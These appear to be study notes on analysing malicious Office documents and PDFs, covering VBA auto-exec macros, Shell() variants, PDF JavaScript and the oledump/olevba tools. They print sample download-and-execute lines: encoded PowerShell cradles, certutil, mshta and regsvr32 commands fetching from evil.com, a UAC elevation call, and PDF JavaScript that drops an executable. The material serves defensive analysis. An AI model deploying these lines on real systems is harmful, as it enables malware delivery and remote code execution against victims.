Elaborated Notes with Examples
1. OLE / VBA Macros

Object Linking and Embedding (OLE) allows Office documents to embed objects. Malicious documents contain VBA (Visual Basic for Applications) macros that execute on open. Auto-execute macros: Document_Open(), AutoOpen(), Workbook_Open(), Auto_Open(). Macros download and execute payloads, manipulate files, and establish persistence.

Example VBA Macro:
Private Sub Document_Open()
  Dim obj As Object
  Set obj = CreateObject("WScript.Shell")
  obj.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4...", 0, False
End Sub
The base64 string decodes to: IEX (New-Object Net.WebClient).DownloadString('http://evil/payload.ps1'). The macro also calls CreateObject("Shell.Application").Namespace(0).ParseName("C:\Windows\System32\wscript.exe").InvokeVerb("runas") to attempt UAC bypass via auto-elevation.
2. Shell() Invocation

VBA's Shell() function is the most common execution method in macros. It runs a command with cmd.exe /c. Analysts look for Shell(, CreateObject("WScript.Shell").Run, and CreateObject("Shell.Application").ShellExecute patterns. Common arguments: PowerShell encoded commands, MSHTA, regsvr32 (SCT), and certutil for download.

Example Shell() Variants:
Shell "cmd /c certutil -urlcache -f http://evil.com/msi.dll %TEMP%\msi.dll && rundll32 %TEMP%\msi.dll,Install", vbHide
CreateObject("WScript.Shell").Run "mshta http://evil.com/payload.hta", 0, False
CreateObject("Shell.Application").ShellExecute "regsvr32", "/s /n /u /i:http://evil/file.sct scrobj.dll", "", "runas", 0
Each variant bypasses different controls: certutil for AppLocker, mshta for living-off-the-land, regsvr32 for bypassing script-blocking.
3. PDF Analysis (JavaScript)

Malicious PDFs use embedded JavaScript for exploitation (HeapSpray, use-after-free) or to open malicious URLs/attachments. Use tools like pdfid.py (counts objects, JS, embedded files), pdf-parser.py (extracts streams), and peepdf (interactive analysis). Look for /JavaScript, /JS, /OpenAction, and /AA entries.

Example PDF Analysis: Running pdfid.py invoice.pdf shows:
PDF Header: %PDF-1.6
obj 45
stream 12
/JS 2
/JavaScript 2
/OpenAction 1
/AA 0
pdf-parser.py -s 10 invoice.pdf extracts a JavaScript stream: app.alert("Document Loading..."); var u = "/malicious.exe"; var c = app.getPath("temp") + "\\temp.exe"; net.HTTP.request({url: u, method: "GET", saveAsPath: c}); app.launchURL("file://" + c);. The PDF opens automatically (OpenAction) and downloads/drops an executable.
4. oledump / olevba

oledump.py analyzes OLE files (Office docs). It lists streams (A1, A2, ... M) with indicators: M = macro, * = interesting. olevba.py (from oletools) extracts and analyzes VBA macros, identifying suspicious patterns like AutoExec, Shell, CreateObject, and HTTP URLs.

Example oledump Output:
A: word/vbaProject.bin
M: 5 -> VBA/ThisDocument
M: 6 -> VBA/Module1
M: 7 -> VBA/Module2 (malicious macro)
oledump.py -s 7 -v malicious.docm | Select-String "Shell|CreateObject|http|URL"
Output:
Call Shell("powershell -e SQBFAFgAIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBjADIALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==", 0)
olevba invoice.docm reports "Suspicious Shell() call found in Module2" with a severity score of 8/10. It detects "Downloads executable from URL" and "Likely malicious VBA macro."
